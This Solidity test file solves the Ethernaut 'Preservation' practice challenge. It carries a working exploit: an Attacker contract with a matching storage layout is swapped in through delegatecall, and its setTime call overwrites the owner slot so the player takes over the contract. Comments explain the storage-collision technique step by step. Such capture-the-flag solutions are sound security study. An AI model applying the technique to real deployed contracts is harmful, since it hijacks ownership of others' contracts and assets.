// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/Preservation.sol";
import "src/levels/PreservationFactory.sol";

contract TestPreservation is BaseTest {
    Preservation private level;

    constructor() public {
        // SETUP LEVEL FACTORY
        levelFactory = new PreservationFactory();
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        /** CODE YOUR SETUP HERE */

        levelAddress = payable(this.createLevelInstance(true));
        level = Preservation(levelAddress);

        // Check that the contract is correctly setup
        assertEq(level.owner(), address(levelFactory));
    }

    function exploitLevel() internal override {
        /** CODE YOUR EXPLOIT HERE */

        vm.startPrank(player);


        Attacker attacker = new Attacker();

        // Our goal is to become the owner of the Preservation contract, preservation contract
        // is only setting the variable at the time of construction 

        // Only way to become owner is somehow modify slot #2 of preservation contract

        // Our contract is making delegate call which means that whenever setFirstTime or setSecondTime is called
        // our contract delegates the call to the target contract (borrows the fn code of the target contract 
        // and executes it in the context of the current contract). We can resolve the challenge if we manage to 
        // somehow modify the code of the setTime fn to modify slot #2 instead of slot #0.

        // First we update the target contract address by calling setFirstTime fn, passing the address of our 
        // attacker contract (typecasting because setTime expects uint256). When the delegate call is sent,
        // setFirstTime modifies slot #0 of preservation contract which is where address of the target
        // contract or timezone1library is stored

        // After this fn call, timezone1Library variable will hold the address of our attacker contract
        level.setFirstTime(uint256(address(attacker)));

        // Our attacker contract storage layout is same as preservation contract and in our setTime fn
        // we now modify owner variable - which acutally modifies owner var/ slot #2 of preservation contract

        // We can now call setTime fn and pass in our address after typecasting it
        // This call will modify slot #2 of preservation contract making us the new owner of the contract
        level.setFirstTime(uint256(player));

        vm.stopPrank();

        assertEq(level.owner(), player);
    }
}

contract Attacker {

    // Storage layout same as preservation contract
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    function setTime(uint256 time) public {
        owner = address(time);
    }
}